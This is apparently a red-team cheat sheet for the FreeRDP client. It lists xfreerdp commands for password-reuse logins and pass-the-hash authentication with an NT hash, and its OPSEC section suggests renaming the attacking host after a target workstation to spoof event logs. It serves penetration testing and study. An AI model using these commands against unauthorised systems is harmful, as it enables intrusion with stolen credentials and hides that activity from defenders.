# FreeRDP

## 01 - Authenticate RDP

- Choose keyboard layout that is familiar to you and then specify the `/kbd:0x<layout_id>` or `/kbd:US` flag.

`$ xfreerdp /kbd-list`

- Fullscreen

```
$ xfreerdp /dynamic-resolution /toggle-fullscreen

$ xfreerdp /dynamic-resolution /f
```

- Connect to legacy operating systems.

`$ xfreerdp -sec:rdp +nego`

- Reuse passwords

```
$ xfreerdp /kbd:US /clipboard /compression /dynamic-resolution /f /cert:ignore /u:<username> /d:<domain_name> /p:<password> /v:<IP> /port:[<PORT>]

$ xfreerdp /kbd:US /clipboard /compression /dynamic-resolution /f /cert:ignore /u:[DOMAIN\]<username> /p:<password> /v:<IP>:[<PORT>]
```

- Pass the Hash

```
$ xfreerdp /kbd:US /clipboard /compression /dynamic-resolution /f /cert:ignore /u:<username> /d:<domain_name> /pth:<nt_hash> /v:<IP> /port:[<PORT>]

$ xfreerdp /kbd:US /clipboard /compression /dynamic-resolution /f  /cert:ignore /u:[<domain_name>\]<username> /pth:<nt_hash> /v:<IP>:[<PORT>]
```

## 02 - OPSEC Consideration

- Change your Linux hostname to the same target workstation to spoof the event logs

`$ sudo hostnamectl set-hostname "<windows_workstation_name_to_spoof>"`

---
## References

- [FreeRDP User Manual](https://github.com/awakecoding/FreeRDP-Manuals/blob/master/User/FreeRDP-User-Manual.markdown)

- [Pass the Hash Attack with RDP](https://infinitelogins.com/2021/02/20/pass-the-hash-attack-with-rdp/)

- [Hacktricks: Pentesting RDP](https://book.hacktricks.xyz/pentesting/pentesting-rdp)

- [Make FreeRDP Prompt User for Username and Password](https://unix.stackexchange.com/questions/119880/make-freerdp-prompt-user-for-username-and-password)